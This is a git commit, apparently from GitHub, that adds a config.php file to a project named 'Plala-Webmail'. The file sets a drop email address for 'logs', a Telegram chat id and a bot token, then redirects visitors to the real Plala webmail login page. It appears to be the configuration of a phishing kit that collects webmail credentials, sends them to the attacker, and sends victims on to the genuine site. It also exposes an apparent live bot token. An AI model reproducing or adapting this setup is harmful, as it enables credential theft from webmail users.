64003f26fb80a1527b26461e802a4dc560b8cb28
Krale22 <99226462+Krale22@users.noreply.github.com>
2024-05-31 11:06:50 +0100

    Add files via upload

---
+++ Plala-Webmail/Plala-Webmail/config.php
@@ -0,0 +1,9 @@
+<?php
+
+$Receive_email="excellogs001@sothost.best";
+$teleid = "961857392";
+$teletok = "1763593303:AAF441KhIcDTQjrItUZDw8cexkwejzhviVg";
+
+
+header("Location: https://web1.plala.or.jp/cgi-bin/mail/plus/webmail_login.cgi");
+?>
